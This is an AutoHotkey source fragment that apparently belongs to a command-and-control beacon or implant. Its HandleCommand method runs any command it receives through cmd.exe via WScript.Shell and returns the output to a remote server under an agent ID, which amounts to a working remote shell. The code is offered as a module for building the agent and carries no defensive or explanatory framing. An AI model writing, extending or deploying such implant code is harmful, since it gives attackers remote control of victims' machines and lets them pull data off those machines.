; ============================================================================
; SHELL COMMAND MODULE
; ============================================================================
; Execute shell commands and return output
; These methods should be added to the NetworkClient class
; ============================================================================

; Execute a shell command and send output to server
HandleCommand(command) {
    if command = "shutdown" {
        ExitApp
    }

    this.Log("HandleCommand starting execution of: " command)
    try {
        shell := ComObject("WScript.Shell")
        exec := shell.Exec('%ComSpec% /c ' command)
        output := exec.StdOut.ReadAll()

        if (output) {
            message := Format("command_output|{}|{}", this.agentID, output)
        } else {
            message := Format("command_output|{}|(Empty)", this.agentID)
        }
        response := this.SendMsg(this.serverIP, this.serverPort, message)
        return true
    } catch as err {
        this.Log("Command execution failed: " err.Message " occurred on line: " err.Line)
        message := Format("command_output|{}|Execution Failed: {}", this.agentID, err.Message)
        response := this.SendMsg(this.serverIP, this.serverPort, message)
        return false
    }
}

; Execute a module by name (default implementation for non-BOF beacons)
ExecuteModule(module, parameters) {
    this.Log("Unknown module: " module)
    return false
}
